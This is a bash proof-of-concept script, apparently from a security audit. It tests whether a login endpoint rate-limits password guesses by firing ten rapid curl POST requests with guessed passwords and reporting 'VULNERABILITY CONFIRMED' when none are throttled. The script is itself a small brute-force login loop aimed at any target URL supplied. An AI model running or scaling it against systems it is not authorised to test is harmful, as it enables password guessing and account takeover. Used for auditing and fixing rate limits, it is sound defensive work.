#!/bin/bash

# POC: No Rate Limiting on Password Endpoint
# Demonstrates unrestricted brute force capability by sending multiple rapid password attempts
# Expected: All requests receive immediate responses without rate limiting (no 429 errors)

TARGET="${1:-http://localhost}"
ENDPOINT="/index.php"
PASSWORD_FIELD="password"
ATTEMPTS=10

echo "[*] Testing Rate Limiting on Password Endpoint"
echo "[*] Target: $TARGET$ENDPOINT"
echo "[*] Sending $ATTEMPTS rapid password attempts..."
echo ""

# Array to store response codes and times
declare -a response_codes
declare -a response_times

# Send multiple rapid requests
for i in $(seq 1 $ATTEMPTS); do
    # Use a different password for each attempt
    password="password$i"
    
    # Record start time
    start_time=$(date +%s%N | cut -b1-13)
    
    # Send POST request with form data
    response=$(curl -s -w "\n%{http_code}" -X POST "$TARGET$ENDPOINT" \
        -d "$PASSWORD_FIELD=$password" \
        -d "action=login" \
        2>&1)
    
    # Record end time
    end_time=$(date +%s%N | cut -b1-13)
    response_time=$((end_time - start_time))
    
    # Extract HTTP status code (last line)
    http_code=$(echo "$response" | tail -n1)
    
    # Extract response body (all but last line)
    body=$(echo "$response" | sed '$d')
    
    response_codes+=($http_code)
    response_times+=($response_time)
    
    echo "Attempt $i: HTTP $http_code (${response_time}ms)"
    
    # Check if rate limiting kicked in (HTTP 429 or 503)
    if [[ $http_code == "429" ]] || [[ $http_code == "503" ]]; then
        echo "[!] Rate limiting detected at attempt $i"
        exit 1
    fi
done

echo ""
echo "=== VULNERABILITY CONFIRMED ==="
echo "[+] All $ATTEMPTS requests completed without rate limiting"
echo "[+] No HTTP 429 (Too Many Requests) responses received"
echo "[+] No HTTP 503 (Service Unavailable) responses received"
echo "[+] Rapid brute force attacks are possible"
echo ""

# Analyze response patterns
echo "Response codes: ${response_codes[@]}"
echo "Response times (ms): ${response_times[@]}"

# Calculate average response time
total_time=0
for time in "${response_times[@]}"; do
    total_time=$((total_time + time))
done
avg_time=$((total_time / ATTEMPTS))

echo "[+] Average response time: ${avg_time}ms"
echo "[+] No exponential backoff detected"
echo ""
echo "[!] VULNERABILITY: No rate limiting on password endpoint allows unrestricted brute force attacks"

exit 0